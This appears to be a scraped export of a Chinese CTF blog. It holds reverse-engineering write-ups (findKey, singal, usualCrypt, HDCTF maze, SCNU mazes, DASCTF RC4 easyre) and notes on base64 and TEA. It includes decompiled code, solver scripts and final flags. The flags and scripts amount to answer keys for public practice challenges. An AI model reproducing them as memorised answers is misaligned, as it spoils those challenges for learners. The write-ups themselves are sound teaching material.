strlen((const char *)String1); sub_40101E(String1, v7, (LPSTR)String1); strcpy(Str, &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;); memset(v17, 0, sizeof(v17)); v18 = 0; v19 = 0; strcpy(v13, &quot;SS&quot;); *(_DWORD *)&amp;v13[3] = 0; v14 = 0; v15 = 0; v8 = strlen(Str); sub_401005(v13, (int)Str, v8); if ( _strcmpi((const char *)String1, Str) ) &#123; SetWindowTextA(hWndParent, &quot;flag&#123;&#125;&quot;); MessageBoxA(hWndParent, &quot;Are you kidding me?&quot;, &quot;^_^&quot;, 0); ExitProcess(0); &#125; memcpy(v12, &amp;unk_423030, 0x32u); v9 = strlen(v12); sub_401005(v20, (int)v12, v9); MessageBoxA(hWndParent, v12, 0, 0x32u); &#125; ++dword_428D54; &#125; else &#123; if ( v11 != 520 ) return DefWindowProcA(hWndParent, Msg, wParam, lParam); if ( dword_428D54 == 16 ) &#123; strcpy(String, &quot;ctf&quot;); v22 = 0; v23 = 0; SetWindowTextA(hWndParent, String); strcpy(Text, &quot;Are you kidding me?&quot;); MessageBoxA(hWndParent, Text, Buffer, 0); &#125; ++dword_428D54; &#125; &#125; else &#123; switch ( v11 ) &#123; case 0x111u: v30 = (unsigned __int16)wParam; v29 = HIWORD(wParam); v10 = (unsigned __int16)wParam; if ( (unsigned __int16)wParam == 104 ) &#123; DialogBoxParamA(hInstance, (LPCSTR)0x67, hWndParent, (DLGPROC)DialogFunc, 0); &#125; else &#123; if ( v10 != 105 ) return DefWindowProcA(hWndParent, Msg, wParam, lParam); DestroyWindow(hWndParent); &#125; break; case 2u: PostQuitMessage(0); break; case 0xFu: hdc = BeginPaint(hWndParent, &amp;Paint); GetClientRect(hWndParent, &amp;Rect); v5 = strlen(Buffer); DrawTextA(hdc, Buffer, v5, &amp;Rect, 1u); EndPaint(hWndParent, &amp;Paint); break; default: return DefWindowProcA(hWndParent, Msg, wParam, lParam); &#125; &#125; return 0;&#125; 其中有两个关键函数 sub_40101E，sub_401005，并且 sub_401005 函数进行了两次，那么我们的 flag 就是第二个 MessageBoxA 输出的 # sub_40101E 这个函数百度之后知道是进行 hash 加密，但还不确定是那种类型的 hash # sub_401005 12345678910111213141516unsigned int __cdecl sub_401590(LPCSTR lpString, int a2, int a3)&#123; unsigned int result; // eax unsigned int i; // [esp+4Ch] [ebp-Ch] unsigned int v5; // [esp+54h] [ebp-4h] v5 = lstrlenA(lpString); for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; *(_BYTE *)(i + a2) ^= lpString[i % v5]; &#125; return result;&#125; 一个很简单的异或，其中 a2 是字符串 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;，a3 是 “SS”，第二次异或的 a2 是 &quot;W^RTI_1miF2n_2lW [TL&quot;，而 a3 是 String1，是没有进行过 hash 加密的 String1 # 总体思路 程序将 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot; 和 SS 字符串进行一次异或，异或之后要将它与 hash 后的 string1 进行对比，在确定 hash 加密类型后我们就可以得到 String1 在 hash 加密之前的原码了，根据第二次 sub_401005 函数传进去的值可以知道，这次异或的 a3 就是 String1，所以我们再进行一次异或就可以得到输出的 flag 了 # 脚本 在第一次异或之后得到了 &quot;c8837b23ff8aaa8a2dde915473ce0991&quot;，通过工具可以确定这是 MD5 加密类型，在网站上在线解密一下，得到 String1 为 &quot;123321&quot;，后面在进行一次异或即可，脚本如下 123456789101112131415161718a = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;b = &#x27;SS&#x27;a = list(a)b = list(b)for i in range(len(a)): a[i] = chr(ord(b[i % 2]) ^ ord(a[i])) print(a[i], end=&#x27;&#x27;)print(&#x27;&#x27;)c = [0x57, 0x5E, 0x52, 0x54, 0x49, 0x5F, 0x01, 0x6D, 0x69, 0x46, 0x02, 0x6E, 0x5F, 0x02, 0x6C, 0x57, 0x5B, 0x54, 0x4C]d = &#x27;123321&#x27;d = list(d)for i in range(len(c)): c[i] = chr(ord(d[i % 6]) ^ c[i]) print(c[i], end=&#x27;&#x27;) 最终结果 得到 flag {n0_Zu0_n0_die} 题目来源：BUUCTF 在线评测 (buuoj.cn)——findKey","tags":["reverse"],"categories":["wp"]},{"title":"singal","path":"/2022/04/28/singal/","content":"看主函数这里，可以知道 v4 就是 unk_403040 这个数组，关键部分是 vm_operad 函数并且将 v4 传了进去 # vm_operad 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879int __cdecl vm_operad(int *a1, int a2)&#123; int result; // eax char Str[200]; // [esp+13h] [ebp-E5h] BYREF char v4; // [esp+DBh] [ebp-1Dh] int v5; // [esp+DCh] [ebp-1Ch] int v6; // [esp+E0h] [ebp-18h] int v7; // [esp+E4h] [ebp-14h] int v8; // [esp+E8h] [ebp-10h] int v9; // [esp+ECh] [ebp-Ch] v9 = 0; v8 = 0; v7 = 0; v6 = 0; v5 = 0; while ( 1 ) &#123; result = v9; if ( v9 &gt;= a2 ) return result; switch ( a1[v9] ) &#123; case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; case 2: v4 = a1[v9 + 1] + Str[v8]; v9 += 2; break; case 3: v4 = Str[v8] - LOBYTE(a1[v9 + 1]); v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ Str[v8]; v9 += 2; break; case 5: v4 = a1[v9 + 1] * Str[v8]; v9 += 2; break; case 6: ++v9; break; case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; case 8: Str[v5] = v4; ++v9; ++v5; break; case 10: read(Str); ++v9; break; case 11: v4 = Str[v8] - 1; ++v9; break; case 12: v4 = Str[v8] + 1; ++v9; break; default: continue; &#125; &#125;&#125; 这里 a1 就是 v4 数组，并且以其中的值来确定 case 转到 16 进制窗口，获取一下数据，因为 case 中没有 0 所以 0 可以去掉 1234567890x0A,0x04,0x10,0x08, 0x03,0x05,0x01,0x04, 0x20,0x08,0x05,0x03, 0x01,0x03,0x02,0x08, 0x0B,0x01,0x0C,0x08, 0x04,0x04,0x01,0x05, 0x03,0x08,0x03,0x21, 0x01,0x0B,0x08,0x0B, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x51,0x08,0x04,0x24, 0x01,0x0C,0x08,0x0B, 0x01,0x05,0x02,0x08, 0x02,0x25,0x01,0x02, 0x36,0x08,0x04,0x41, 0x01,0x02,0x20,0x08, 0x05,0x01,0x01,0x05, 0x03,0x08,0x02,0x25, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x41,0x08,0x0C,0x01, 0x07,0x22,0x07,0x3F, 0x07,0x34,0x07,0x32, 0x07,0x72,0x07,0x33, 0x07,0x18,0x07,0xA7,0xFF,0xFF,0xFF, 0x07,0x31,0x07,0xF1,0xFF,0xFF,0xFF, 0x07,0x28,0x07,0x84,0xFF,0xFF,0xFF, 0x07,0xC1,0xFF,0xFF,0xFF,0x07,0x1E, 0x07,0x7A 第一个数据是 0x0A 也就是 10，看到 case10，点进去之后发现 case10 就是输入 flag 的函数，储存在 Str 中，长度为 15 # case1 1234567case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; 在后面的几个 case 中，分别对输入的 flag 进行了一些运算，然后我们通过 case1 来储存计算后的值的下标，即 100-114，15 个数据 # case7 123456789case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; 在 a1 数组中我们可以看到最后面有很多的 7，这一段就是对之前的 flag 的计算进行比较，计算后的结果是要等于 a1 数组中 7 后面的数据的，数了一下发现，刚好有 15 个 7，也就是 flag 的长度，刚好和 flag 进行比较，将这 15 个数据单独拿出来 10x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a # 总体思路 在输入 flag 之后，函数将 flag 的每一位进行一个运算，运算之后通过 case1 来储存计算后的结果，计算并储存完之后再通过 case7 来对比是否等于它已经给出的密文 # 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; int v9 = 0; int v8 = 0; int v7 = 0; int v6 = 0; int v5 = 0; int v4 = 0; int last_v9 = 0,last_v8 = 0,last_v7 = 0,last_v6 = 0 ,last_v5 = 0,last_v4 = 0;int f(int a1[],int k,int v[])&#123; v4 = k; while(1) &#123; switch ( a1[v9] ) &#123; case 1: if(v[v6] == v4) &#123; printf(&quot;k = %d &quot;,k); ++v9; ++v6; ++v8; last_v9 = v9; last_v8 = v8; last_v6 = v6; return 1; &#125; else &#123; v9 = last_v9; //找不到则返回上一个v9 v8 = last_v8; v6 = last_v6; return 0; &#125; break; case 2: v4 = a1[v9 + 1] + v4; v9 += 2; break; case 3: v4 = v4 - a1[v9 + 1]; v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ v4; v9 += 2; break; case 5: v4 = a1[v9 + 1] * v4; v9 += 2; break; case 6: ++v9; break; case 11: v4 = v4 - 1; ++v9; break; case 12: v4 = v4 + 1; ++v9; break; default: v9++; break; &#125; &#125;&#125;int main()&#123; int v[16] = &#123;0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a&#125;; int a1[] = &#123;0x04,0x10,0x08,0x03,0x05,0x01,0x04, 0x20,0x08,0x05,0x03, 0x01,0x03,0x02,0x08, 0x0B,0x01,0x0C,0x08, 0x04,0x04,0x01,0x05, 0x03,0x08,0x03,0x21, 0x01,0x0B,0x08,0x0B, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x51,0x08,0x04,0x24, 0x01,0x0C,0x08,0x0B, 0x01,0x05,0x02,0x08, 0x02,0x25,0x01,0x02, 0x36,0x08,0x04,0x41, 0x01,0x02,0x20,0x08, 0x05,0x01,0x01,0x05, 0x03,0x08,0x02,0x25, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x41,0x08,0x0C,0x01&#125;; int i,j,k = 0; int flag[15] = &#123;0&#125;; for(i = 0 ; i &lt; 15 ; i++) &#123; for(k = 31 ; k &lt;= &#x27;z&#x27;; k ++) //从1到z一个一个试 &#123; if(f(a1,k,v)) &#123; flag[i] = k; break; &#125; &#125; &#125; printf(&quot;flag&#123;&quot;); for(i = 0 ; i &lt; 15 ; i++) &#123; printf(&quot;%c&quot;,flag[i]); &#125; printf(&quot;&#125; &quot;); return 0;&#125; 得到 flag {757515121f3d478} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[网鼎杯 2020 青龙组] singal","tags":["reverse"],"categories":["wp"]},{"title":"usualCrypt","path":"/2022/04/25/usualCrypt/","content":"直接看到主函数 关键函数位 17 行的 sub_401080，我们点进去看看 这个函数又可以分为三个部分，第一个部分是 sub_401000 函数，第三部分是 sub_401030，第二部分就是这中间的部分，我是先点开了 byte_40E0A0 这个数组，点进去一看发现了 base64 的编码表，再回头看第二部分的加密，就可以确定这是 base 编码了 然后再看看第一部分的函数 发现这里对 base64 的编码表做了点手脚，把里面的位置调换了一下 在看第三部分 sub_401030，这个函数将编码后的 flag 的大小写互换了一下 总结一下就是将 flag 用换了表的 base64 编码一下，然后再把大小写互换一下即可，然后我们再找一下密文，密文就是主函数中的 byte_40E0E4 也就是 zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9 先写一个大小写互换和得出新表的脚本吧 12345678910111213141516171819202122232425a = &#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;b = &#x27;&#x27;for i in range(len(a)): if a[i] &gt;= &#x27;A&#x27; and a[i] &lt;= &#x27;Z&#x27;: b += chr(ord(a[i]) + 32) if a[i] &gt;= &#x27;a&#x27; and a[i] &lt;= &#x27;z&#x27;: b += chr(ord(a[i]) - 32) if a[i] &lt;= &#x27;9&#x27; and a[i] &gt;= &#x27;0&#x27;: b += a[i]print(b)v1 = &#x27;&#x27;result = 6part_base64 = &#x27;ABCDEFGHIJKLMNO&#x27; # byte_40E0A0base64 = &#x27;KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; # byte_40E0AAbase1 = list(part_base64)base2 = list(base64)for i in range(result, 15): v1 = base2[result] base2[result] = base1[result] base1[result] = v1 result += 1a = &#x27;&#x27;.join(base1 + base2[5:])print(a) 跑出来的结果如下，上面是大小写互换后的密文，下面是新表 最后我们再用一个脚本把新的 base64 编码表放进去，再来解码这个密文就可以得到 flag 啦～ 得到 flag {bAse64_h2s_a_Surprise}","tags":["reverse"],"categories":["wp"]},{"title":"如何patch花指令","path":"/2022/04/17/如何patch花指令/","content":"今天是在做题的过程中遇到一个新的东西，也就是花指令，实在是让我毫无头绪，后面搜了 wp 才知道这个题有个花指令，需要我们把它 patch 掉 其实这道题还是个迷宫题哈哈哈，先不管它是什么题，我们继续 这个程序是一个 32 位的带 upx 壳的程序，脱完壳之后，拖到 ida pro 中查看伪代码，但是我们虽然一点进去就是 main 函数，但是这个函数并没有被 ida 给反汇编，这就是因为花指令 在 main 函数的汇编代码这里我们可以看到，有一个 jnz 指令，这个 jnz 指令就一般是花指令的特征，还有一个 jz 指令也是（其实这里我并没有很懂，我的汇编学的不是很好，到时候还得恶补 T^T），一般这种花指令的后面都会带上一个 call 指令，而这个 call 指令根本就不是一个完整的 call 指令，但是我们的 ida 还是会把它当成一个完整的指令，这就会导致 ida 的反汇编到这里就会出错，那么我们现在就要来解决它 我们先把光标移到这个 call 上，然后点开左上角 Edit 中的 patch program 中的 change byte，然后可以看到下面这个界面 其中的这个 E8 就是汇编语言 call 的机器码，就是供机器识别的代码，而我们需要做的就是把这个 call 指令改为一个空指令，也就是 nop 指令，然后 nop 指令的机器码是 90，所以我们在这里把这个 E8 改为 90 就可以了，改完之后就是下面这样子 我们发现原来的 call 指令没了，取而代之的是一条空指令 nop，这样 ida 就不会反汇编错误了 最后我们选中从 main 函数开头到结尾，然后按 P，就相当于把这个汇编代码反汇编成伪代码，然后我们就可以发现在 Function window 看到我们的 main 函数了，然后点进去按 F5 反汇编，就进入到了我们主函数的伪代码，如下 一道很简单的迷宫题，很容易知道它的方向就是 wasd，然后起点就是 * asc_408078 这一串数据，点进去得知是（7，0），终点就是 if 条件中的（5，-4） 至于迷宫图（strings window 中查看），它一共有 70 个字符，要么是 7×10 就是 10×7 哈哈哈，这里是 7 行 10 列 1234567*******+********* ****** **** ******* **F****** ************** 所以 flag 就为 flag {ssaaasaassdddw} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[HDCTF2019]Maze","tags":["reverse"],"categories":["笔记"]},{"title":"2020华南师大CTF新生赛maze","path":"/2022/04/15/2020华南师大CTF新生赛maze/","content":"又是一道迷宫题，而且又是华南师大的新生赛题哈哈哈哈，这道题比 19 年的要难上不少哈哈哈 依然是 32 位无壳程序，用 ida pro 打开后查看主函数 可以看出它的关键部分依然是 check 函数 我们要做的还是一样的，要找出地图在哪里，正好这个 check 函数下面有一个 map 数组，估计就在这里面了，我们点进去看，可以看到 map=v2，然后 v2 又等于 num 数组 我点开 num 数组，发现里面有很多数字，并不符合函数中的 16 个循环，这里我很疑惑，然后参考了大佬的 wp 之后才知道我们可以用 ida 的本地调试来获取这 16 次循环的 v2 值，也就是 num 数组的值，操作如下 首先我们开启 debugger 中的 debugger windows，然后找到 createmap 函数的循环，做一个断点 然后按 F9 开始调试，按 F8 一步一步的走，首先程序会弹出来运行，我们要先随便输入一个数字进去才会开始运行 createmap 函数，所以我们先随便输入一个数字，再 F8 开始调试 我们要打开 windows debugger 中的 locals 来查看这个 v2 也就是 num 数组的值，我们要手动让他进行 16 次循环，然后得到 16 个数字，最终得到的数组如下 1num = [0xFFFF, 0x83F7, 0xBBF7, 0xBB17, 0xBB57, 0xB857, 0xBF57, 0xBF17, 0xBFB7, 0xBFB7, 0x8611, 0xF7B5, 0xF7B5, 0x7B4, 0xFF87, 0xFFFF] 不过在这里我想了很久，这怎么就是迷宫了呢，一对 16 进制的数字就是迷宫？不可能！再怎么说也要是 2 进制吧！然后我就用 python 把这 16 个数字全部转为 2 进制，发现真的可以，的出来的结果应该就是迷宫了！ 不过，这倒数第三行少了几个数字，根据经验，在前面补 0 就行了，让它对齐，不过有的大佬的 wp 脚本跑出来前面就有 0，挺懵逼的我，我的只能自己补？ 最后一步就开始走迷宫吧！咦？不对啊，wasd 走出来的结果根本不对！噢，原来是我忽略了一开始的 check 函数，我返回去看，发现这里面有这个迷宫真正的走法 不难看出，[13],[0] 这个位置就是起点了，终点就是 [13],[15] 了，这里有 l、k、h、j 四个字母，估计就是方向键了，也不难得出，k 是向上走，h 是向左走，j 是向下走，那 l 就是向右走了 最后依照这个路径走完迷宫就可以了，不过要记住是要走最短的路径噢！ （一开始我直接提交的路径，一直是 sorrrrrrrry~ 仔细看才发现它非要我们包上 flag {}，不过之前用 wasd 的时候也没包 flag… 挺无语的哈哈哈哈哈） 最终 flag：flag{llllkkkhhhkkkkkkkkklllljjjjllljjljjjjjjjlllkkkklljjjl}","tags":["reverse"],"categories":["wp"]},{"title":"2019华南师大CTF新生赛maze","path":"/2022/04/14/2019华南师大CTF新生赛maze/","content":"这道题是本周的任务之一，是一道迷宫题，因为是华南师大的赛题我一开始以为很难，抱着试试的心态去做，没想到并没有我想象中的难，挺简单的哈哈哈哈，但可能有一点取巧了 首先检查程序，是一个 32 位的无壳程序，然后就是丢到 ida pro 中看主函数，然后可以看到以下这部分 它的关键部分就是我圈起来的这一部分，也就是这个 check 函数，同时它有一个条件是 flag 的长度要为 24 位，也就是说走出这个迷宫的路径就是 24，现在我们先查看一下 check 函数 12345678910111213141516171819202122232425262728293031323334353637bool __cdecl check(char *flag)&#123; char *v1; // eax int v2; // eax char *cur; // [esp+Ch] [ebp-4h] cur = &amp;maze[14]; while ( *flag &amp;&amp; *cur != 42 ) &#123; v1 = flag++; v2 = *v1; if ( v2 == 100 ) &#123; ++cur; &#125; else if ( v2 &gt; 100 ) &#123; if ( v2 == 115 ) &#123; cur += 13; &#125; else &#123; if ( v2 != 119 ) return 0; cur -= 13; &#125; &#125; else &#123; if ( v2 != 97 ) return 0; --cur; &#125; &#125; return *cur == 35;&#125; 其中有一个 maze 数组，这应该就是我们的迷宫图了，我们点进去看，可以看到迷宫的组成 虽然有了它的组成部分，但是我并不知道它的格式是什么，从 check 函数来看，因为 @是第 14 位，所以我可以知道 @就是起点，终点都不用想，肯定是 #了，那么现在问题的关键就是要知道这个迷宫的格式，他肯定是个矩阵型的，这才符合一个标准的迷宫图形 这里我想到一个办法，就是把它复制粘贴到 word 文档中，看它有多少个字符，看会不会符合一个矩阵型，然后发现它一共有 169 个字符，我就想这不就是 13 的平方吗？于是我就赶紧操作起来，把它分为了一个 13×13 的迷宫，这就是它的格式了（也是我取巧的部分吧） 弄完之后就是长这个样子 然后我就以 @为起点，# 为终点来走迷宫（注意要是最短路径），然后走出了一个长度为 24 的路径，用 WASD 来表示上下左右，点开程序输入进去，发现是对的。不过这里有一点要注意一下，就是迷宫的每一步都要对齐，不要一下子就飘到另一个地方了，我一开始因为这样而错了好几次。 最后的结果如下 所以 flag 就是：flag{sssssdsssddsdddwwdwwaaaw}","tags":["reverse"],"categories":["wp"]},{"title":"深入了解base64编码","path":"/2022/04/13/深入了解base64编码/","content":"平时 base64 的题目也有不少，生活中也是很常见的，但是每次遇到 base64 都是在网上找解码器直接一键解码，从没有去了解过它的具体实现过程，因为这周我们小组的任务要求深入了解 base64，才去真正的了解了 base64 # base64 是什么 base64 是一种从二进制到文本的编码方式，而且编码后的结果只包含 ASCII 基础字符，值得注意的是，base64 并不能算是加密算法，只是一种编码方式，算法什么的都是公开的，所以不能依赖它来进行加密 为什么要叫做 base64 呢？是因为它的输出字符串是由 64 个可打印字符组成的，下面是它的索引表（来源于百度百科） 索引 对应字符 索引 对应字符 索引 对应字符 索引 对应字符 0 A 17 R 34 i 51 z 1 B 18 S 35 j 52 0 2 C 19 T 36 k 53 1 3 D 20 U 37 l 54 2 4 E 21 V 38 m 55 3 5 F 22 W 39 n 56 4 6 G 23 X 40 o 57 5 7 H 24 Y 41 p 58 6 8 I 25 Z 42 q 59 7 9 J 26 a 43 r 60 8 10 K 27 b 44 s 61 9 11 L 28 c 45 t 62 + 12 M 29 d 46 u 63 / 13 N 30 e 47 v 14 O 31 f 48 w 15 P 32 g 49 x 16 Q 33 h 50 y 其实也就是我们平常在做题过程中可以看见的一个数组”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“ 废话不多说，直接开始了解它的编码过程吧 # 编码过程 # 字符串分组 将待转换的字符串每三个字节分为一组，每个字节占 8bit，一共是 24 个字节 这里我以我名字的首字母大写 TCH 为例，T、C、H 在 ASCII 码表中的位置分别是 84，67，72，而这三个数字的二进制码又分别为 1010100，1000011，1001000，不足八位的就在前面补 0，也就是 01010100，01000011，01001000，那么第一步就完成了 # 二进制码分组 以上我们已经得到了一个 3×8=24 位的二进制码，我们还需要把这 24 位二进制码分为四组 6 位二进制码，也就是 010101，000100，001101，001000，就是从前面开始六位六位的去划分就可以了 # 添 0 得到 4 字节 在这一步我们将以上得到的四组六位二进制码再在他们每组的前面添加两个 0，也就是 00010101，00000100，00001101，00001000，这样就得到了四组八位二进制码，也就得到了四个字节 # 根据索引表得到具体的值 将以上得到的四个二进制数在我们的 base64 索引表中找到具体的值，其中 00010101=21=V，00000100=4=E，00001101=13=N，00001000=8=I 所以，TCH 最终的编码结果就是 VENI 光是文字说明可能不是很形象，这里用一个表格来呈现一下可能会更清晰 这就是总体过程 # 位数不足情况 有时候会有一些特殊情况，因为我举得例子恰好是三个字节，那有时候不足三个字节呢？那该如何处理？其实很简单，如果是两个字节，就一共有 16 个二进制位，还是按照规则进行分组，每六个一组的话，第三组会缺少 2 位，用 0 补齐即可得到三个 base64 编码，第四组完全没有数据的话就用”=“来补上，所以打个比方 “BC” 转换之后就是 “QKM=” # 注意事项 大多数编码都是由字符串转化成二进制的过程，而 Base64 的编码则是从二进制转换为字符串。与常规恰恰相反， Base64 编码主要用在传输、存储、表示二进制领域，不能算得上加密，只是无法直接看到明文。也可以通过打乱 Base64 编码来进行加密，在我之前刷题的过程中就有遇到过 base64 换表的题，就是将 base64 索引表的顺序打乱从而形成一个新表，再来进行编码的过程 # 换表情况 在注意事项中有提到换表的情况，其实这个不难理解，我们正常的表是这样的”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“，我们可以随意的把它换成别的顺序，只要是 64 位就可以了，比如”123456789abcdefghijklmnopqrstuvwxyz+/ABCDEFGHIJKLMNOPQRSTUVWXYZ“，那么从 0 到 63 就是从 1 到 Z 的一个新表，中间的过程是一样的，只是最后索引部分需要从这个新表中进行索引即可，这就是换表的情况，因为之前刷题的时候遇到过所以这里就着重写一下，以后遇到还可以再看看","tags":["算法"],"categories":["笔记"]},{"title":"DASCTF×SU2022-easyre","path":"/2022/04/03/DASCTF×SU2022-easyre/","content":"# 思路 这个程序是一个 32 位的程序，并且是带了 asp 的壳，我还不会手动去壳，所以就用工具把壳去掉了，下面看到主函数 在点进去第一个函数之后就很明显，这是个 RC4 算法的题，而且不难看出，这个 dword_492040 [i] 就是 S 表，在这我将它的名字改位 S [i] 在看第二个函数，也很明显，这个 v1 应该就是密钥了，用 v1 来填充 k 表，但是这里的填充规则是有些改动的，我们需要知道 sub_41A038 的值才能进行计算，我们先不管这个 要注意的是，v1 密钥 “123456” 是字符串的形式，但我们填表是要用十进制的形式的，将 “123456” 转化为十进制之后是这样的 第三个函数是对 S 表的初始置换 第四个函数是计算新 K 表也就是密钥流，用来与明文进行异或运算的，这个 dword_492940 数组就是新 K 表 现在我们退出去，第一行有一个 v3，这个就是我们刚才需要知道的一个值，那它等于多少呢？根据逻辑关系，v3 的值是四个函数下面的 for 循环的限制条件（v3 也是明文的长度），也就是最后一步，即异或运算的循环次数，这个循环次数取决于 v2 数组的长度，而 v2 的长度是 42，所以 v3=42 在最后的 for 循环中，密文也就是 v2，等于 K 表的低位与明文进行异或然后再加 71，那么我们的脚本写出来就是把密文减 71 再与 K 表异或就是我们的明文了 # 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include&lt;iostream&gt;#include&lt;stdint.h&gt;using namespace std;int s[256];char t[256];int k[50];void swap(int* a, int* b)&#123;\tuint8_t tmp;\ttmp = *a;\t*a = *b;\t*b = tmp;&#125;void Rc4_Init(uint8_t* key, uint32_t klen)&#123;\tint i, j;\tfor (i = 0; i &lt; 256; i++)\t&#123; s[i] = i; t[i] = key[i % klen];\t&#125;\tj = 0;\tfor (i = 0; i &lt; 256; i++)\t&#123; j = (j + s[i] + t[i]) % 256; swap(&amp;s[i], &amp;s[j]); //交换的函数(可以套用这个模板)\t&#125;&#125; void __cdecl sub_401619()&#123;\tint v3; // [esp+10h] [ebp-10h]\tint v4; // [esp+14h] [ebp-Ch]\tint v5; // [esp+18h] [ebp-8h]\tint i; // [esp+1Ch] [ebp-4h]\tint a2 = 42;\tv4 = 0;\tv5 = 0;\tfor (i = 0; a2--; k[v4++] = s[(s[v5] + s[i]) % 256])\t&#123; i = (i + 1) % 256; v5 = (v5 + s[i]) % 256; v3 = s[i] + 66; s[i] = s[v5] - 33; s[i] ^= 2u; s[v5] = 5 * v3; s[v5] = s[i] - 10; s[v5] += s[i]; s[i] -= 18;\t&#125; //加密部分的函数&#125;int main()&#123;\tuint8_t v2[42];\tuint8_t ket[7] = &#123;49,50,51,52,53,54&#125;;\tRc4_Init(ket, 6);\tsub_401619();\tv2[0] = -61;\tv2[1] = -128;\tv2[2] = -43;\tv2[3] = -14;\tv2[4] = -101;\tv2[5] = 48;\tv2[6] = 11;\tv2[7] = -76;\tv2[8] = 85;\tv2[9] = -34;\tv2[10] = 34;\tv2[11] = -125;\tv2[12] = 47;\tv2[13] = -105;\tv2[14] = -72;\tv2[15] = 32;\tv2[16] = 29;\tv2[17] = 116;\tv2[18] = -47;\tv2[19] = 1;\tv2[20] = 115;\tv2[21] = 26;\tv2[22] = -78;\tv2[23] = -56;\tv2[24] = -59;\tv2[25] = 116;\tv2[26] = -64;\tv2[27] = 91;\tv2[28] = -9;\tv2[29] = 15;\tv2[30] = -45;\tv2[31] = 1;\tv2[32] = 85;\tv2[33] = -78;\tv2[34] = -92;\tv2[35] = -82;\tv2[36] = 123;\tv2[37] = -84;\tv2[38] = 92;\tv2[39] = 86;\tv2[40] = -68;\tv2[41] = 35;\tfor (int i = 0; i &lt; 42; i++) v2[i] = ((v2[i] - 71) ^ (k[i] &amp; 0xff));\tprintf(&quot;%s&quot;,v2); return 0; &#125;//DASCTF&#123;Welc0me-t0-j01n-SU-l0ve-suyug1eg1e&#125; 题目来源：DASCTF × SU 2022 —— easyre","tags":["reverse","RC4"],"categories":["wp"]},{"title":"TEA算法","path":"/2022/04/01/TEA算法/","content":"# TEA 简介 TEA（Tiny Encryption Algorithm）是一种分组加密算法，TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了。该算法使用了一个神秘常数 δ 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 δ 的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1) 231」（也就是程序中的 0×9E3779B9） 之后 TEA 算法被发现存在缺陷，作为回应，设计者提出了一个 TEA 的升级版本 ——XTEA（有时也被称为 “tean”）。XTEA 跟 TEA 使用了相同的简单运算，但它采用了截然不同的顺序，为了阻止密钥表攻击，四个子密钥（在加密过程中，原 128 位的密钥被拆分为 4 个 32 位的子密钥）采用了一种不太正规的方式进行混合，但速度更慢了 # 加密解密过程 这里有一个大佬写的 c 语言脚本可以实现 TEA 加密，我们以这个脚本来分析一下它的加解密过程 # 加密过程 # 32 位无符号整数 整型的每一种都有无符号（unsigned）和有符号（signed）两种类型（float 和 double 总是带符号），在默认情况下声明的整型变量都是有符号类型，如果要声明其不是无符号，则需要在类型前加上 unsigned。这两者的区别就是，无符号类型可以保存两倍于有符号类型的正整数数据，比如 16 位系统中 int 能储存的数据范围为 - 32768~32767，而无符号的范围则是 0 ~ 65535. 而在我们的脚本中，uint32_t 就是定义其为 32 位无符号整数，关于其还要注意，当某个数据不可能为负数的时候我们就可以这样定义：uint32_t，unsigned char, unsigned int, size_t, uint64_t, unsigned long int，也可以这么理解，当有些数据我们不知道是正是负时，就不能用以上定义. 此外，在运算两个 32 位无符号整数时要注意它会不会超过它的最大值，比如： 123uint32_t a,b,c;uint64_t s;s = a * b + c; 在这个运算中 a*b 可能会超过 uint32_t 的最大值，所以我们要这样写： 1s = （(uint64_t)a )* b + c； 我们现在再来看脚本： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;//加密函数void encrypt(uint32_t* v, uint32_t* k)&#123; uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++)\t&#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); 